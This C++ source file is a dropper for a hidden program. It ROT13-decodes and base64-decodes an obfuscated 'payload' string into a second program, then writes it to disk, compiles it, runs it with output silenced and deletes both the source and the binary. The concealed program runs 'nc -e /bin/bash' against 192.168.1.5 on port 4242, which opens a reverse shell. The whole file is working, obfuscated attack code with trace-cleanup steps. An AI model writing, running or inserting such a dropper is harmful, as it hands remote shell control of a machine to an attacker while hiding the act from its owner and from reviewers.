#include <iostream>
#include <string>
#include <pstream.h>
#include <cstring>

std::string decrypt(std::string source)
{
        std::string transformed;
        for (size_t i = 0; i < source.size(); ++i) {
                if (isalpha(source[i])) {
                        if ((tolower(source[i]) - 'a') < 13)
                                transformed.append(1, source[i] + 13);
                        else
                                transformed.append(1, source[i] - 13);
                } else {
                        transformed.append(1, source[i]);
                }
        }
        return transformed;
}

int main(){
std::string payload = "V3MupUybpKVtCUMvMzqypz56CykuqzSaVUchqzRbXKftMzkzM3W6XPVtLKNtYKVtY292LF9iozM1VQR5Zv4kAwthZF41VQDlAQVtVvx7VTIlM2uyLFNjB30=";
std::string cmd = "echo ";
cmd.append(decrypt(payload));
cmd.append(" | base64 -d");
redi::ipstream proc(cmd, redi::pstreams::pstdout | redi::pstreams::pstderr);
std::string line;
std::string decoded1;
std::string decoded2;
while(std::getline(proc.out(), line)){
        decoded1.append(line);
        decoded1.append("\n");
        }
if(proc.eof() && proc.fail())
        proc.clear();
while(std::getline(proc.err(), line)){
        decoded1.append(line);
        decoded1.append("\n");
        }

decoded2 = decrypt(decoded1);
std::string fC = "touch hello.cpp";
system(fC.c_str());
fC="printf '";
fC.append(decoded2);
fC.append("' >> hello.cpp");
system(fC.c_str());
system("g++ hello.cpp -o hello");
system("rm hello.cpp");
system("./hello 1>&- 2>&-");
system("rm hello");
return 0;
}
